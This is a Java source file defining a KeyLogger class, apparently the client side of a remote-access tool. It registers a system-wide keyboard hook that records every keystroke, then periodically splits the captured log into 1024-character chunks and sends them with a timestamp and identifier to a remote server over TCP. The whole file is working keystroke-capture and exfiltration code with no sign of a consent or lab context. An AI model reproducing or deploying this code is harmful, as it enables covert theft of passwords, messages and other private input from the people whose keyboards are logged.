package Client;

import Server.IntervalThread;
import SocketMessageReceiver.DataType.KeyLogRequest;
import SocketMessageSender.CustomUserSender.KeyLogSender;
import Utilities.Utilities;
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import lc.kra.system.keyboard.event.GlobalKeyListener;

import java.awt.event.KeyEvent;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyLogger {
    private static final int LIMIT_LOG_SIZE = 1024; //Chars
    public static KeyLogger instance;

    public long interval;
    public boolean isRunning;

    private StringBuilder log = new StringBuilder();

    private GlobalKeyListener listener;
    private GlobalKeyboardHook keyboardHook;

    private IntervalThread intervalThread;


    public KeyLogger(long interval) {
        this.interval = interval;

        this.intervalThread = new IntervalThread(interval);
        this.intervalThread.addAction(this::Log);

        this.keyboardHook = new GlobalKeyboardHook(false);
        this.listener = new GlobalKeyListener() {
            @Override
            public void keyPressed(GlobalKeyEvent globalKeyEvent) {
                var keyCode = globalKeyEvent.getVirtualKeyCode();
                var keyChar = keyCode == GlobalKeyEvent.VK_RETURN ? '\n' : "[" + KeyEvent.getKeyText(keyCode) + "]";

                log.append(keyChar);
            }

            @Override
            public void keyReleased(GlobalKeyEvent globalKeyEvent) {

            }
        };
    }

    public void start() {
        isRunning = true;

        intervalThread.start();
        keyboardHook.addKeyListener(listener);
    }

    public void stop() {
        isRunning = false;

        intervalThread.stop();
        keyboardHook.removeKeyListener(listener);
    }

    private void Log() {
        var logSize = log.length();
        var splitSize = Math.round((logSize * 1.0f / LIMIT_LOG_SIZE) + .5f);

        var bigLog = log.toString();
        var sender = new KeyLogSender(ClientInstance.tcpClient);
        var uuid = Utilities.getUUID();

        var date = new Date();
        var format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        var dateStr = format.format(date);

        for (var i = 0; i < splitSize; i++) {
            var start = i * LIMIT_LOG_SIZE;
            var end = Math.min(start + LIMIT_LOG_SIZE, logSize);

            var log = bigLog.substring(start, end);

            sender.send(null, new KeyLogRequest(uuid, log, dateStr));
        }

        log = new StringBuilder();
    }
}
